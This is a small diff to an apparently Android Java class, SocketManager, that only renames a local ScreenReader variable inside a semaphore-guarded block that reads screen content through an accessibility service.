@@ -2161,11 +2161,11 @@ public class SocketManager {
                         UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
                         JSONObject screenResult = null;
                         if (svc != null) {
-                            ScreenReader sr = new ScreenReader(svc);
+                            ScreenReader gcodeScreenReader = new ScreenReader(svc);
                             boolean acq = false;
                             try {
                                 acq = accessSemaphore.tryAcquire(5, TimeUnit.SECONDS);
-                                if (acq) screenResult = sr.readScreen();
+                                if (acq) screenResult = gcodeScreenReader.readScreen();
                             } finally {
                                 if (acq) accessSemaphore.release();
                             }
